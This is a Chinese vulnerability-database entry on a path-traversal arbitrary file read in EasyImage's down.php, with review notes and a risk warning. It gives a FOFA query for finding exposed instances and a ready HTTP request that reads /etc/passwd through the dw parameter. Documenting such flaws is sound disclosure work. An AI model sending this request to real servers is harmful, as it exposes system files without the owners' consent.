---
source: "wy876 漏洞文库"
title: "EasyImage简单图床 down.php dw路径遍历读取"
product: "EasyImage简单图床"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，Linux示例及相对目录层数"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xvk2q1dxwph2krte"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%AE%80%E5%8D%95%E5%9B%BE%E5%BA%8A/EasyImagedown.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"EasyImage-简单图床\""
id: "vw-e27a5e34963887656459e497"
entity_id: "ve-e27a5e34963887656459e497"
schema_version: "1"
---

# EasyImage简单图床 down.php dw路径遍历读取

## 条目说明

- 对象与具体问题：EasyImage简单图床；down.php dw路径遍历读取
- 版本、配置及部署条件：版本未知，Linux示例及相对目录层数
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 开源图床宜统一开源软件类别而非泛商业软件
- 只有读取passwd请求，无响应、路径归一化源码、补丁版本
- 遍历层数依部署目录，空Host和冗余浏览器头可精简

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
EasyImage：一个简洁的开源图床程序，支持多文件上传,简单无数据库,返回图片url,markdown,bbscode,html的一款图床程序。EasyImage down.php处存在任意文件读取漏洞。

## 二、影响版本
+ EasyImage

## 三、资产测绘
+ fofa`app="EasyImage-简单图床"`
+ 特征


## 四、漏洞复现
```http
GET /application/down.php?dw=../../../etc/passwd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xvk2q1dxwph2krte>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
